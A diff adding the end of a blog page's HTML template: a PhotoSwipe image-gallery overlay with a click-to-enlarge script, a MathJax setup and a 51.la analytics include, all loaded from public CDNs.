+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+      tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+  });
+
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for(i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+<script type="text/javascript" src="https://js.users.51.la/20544303.js"></script>
+  </div>
+</body>
+
+</html>
